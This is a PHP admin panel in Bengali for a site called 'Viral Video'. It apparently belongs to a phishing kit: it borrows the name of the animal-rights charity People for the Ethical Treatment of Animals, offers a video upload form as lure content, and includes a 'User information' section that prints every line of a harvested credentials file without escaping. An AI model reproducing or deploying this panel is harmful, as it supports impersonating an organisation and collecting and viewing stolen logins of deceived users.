<?php
session_start();
if (!isset($_SESSION['admin_logged_in'])) {
    header("Location: login.php?admin=1");
    exit();
}
?>

<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ভাইরাল ভিডিও - এডমিন</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <div class="logo">
            <div class="logo-img">PCTA</div>
            <div class="logo-text">
                <h1>ভাইরাল ভিডিও</h1>
                <p>People for the Ethical Treatment of Animals</p>
            </div>
        </div>
        <nav>
            <a href="logout.php" class="btn">লগআউট</a>
        </nav>
    </header>

    <main class="admin-panel">
        <section class="upload-section">
            <h2>ভিডিও আপলোড</h2>
            <form action="upload.php" method="post" enctype="multipart/form-data">
                <input type="file" name="video" accept="video/*" required>
                <button type="submit">আপলোড করুন</button>
            </form>
        </section>

        <section class="credentials-section">
            <h2>ব্যবহারকারীর তথ্য</h2>
            <div class="credentials-list">
                <?php
                $credentials = file('credentials/users.txt');
                foreach ($credentials as $line) {
                    echo '<div class="credential-item">'.$line.'</div>';
                }
                ?>
            </div>
        </section>
    </main>

    <footer>
        <p>© 2023 ভাইরাল ভিডিও - এডমিন প্যানেল</p>
    </footer>
</body>
</html>
